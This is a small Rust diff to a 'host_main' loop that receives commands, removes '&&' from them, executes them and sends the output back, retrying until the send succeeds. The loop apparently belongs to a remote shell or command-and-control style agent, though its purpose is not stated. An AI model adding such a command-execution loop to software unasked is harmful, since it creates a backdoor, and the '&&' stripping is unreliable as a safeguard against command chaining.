@@ -7,10 +7,10 @@ pub fn host_main() {
     loop {
         let mut data = get_command();
         if data.contains("&&") {
-            data.remove("&&".parse().unwrap());
+            let data = data.replace("&&", "");
             let result = exc(data);
             loop {
-                if send(&result).is_ok(){
+                if send(&format!("**{}", result)).is_ok(){
                     break;
                 }
                 thread::sleep(time::Duration::from_secs(1));
@@ -19,3 +19,4 @@ pub fn host_main() {
         }
     }
 }
+
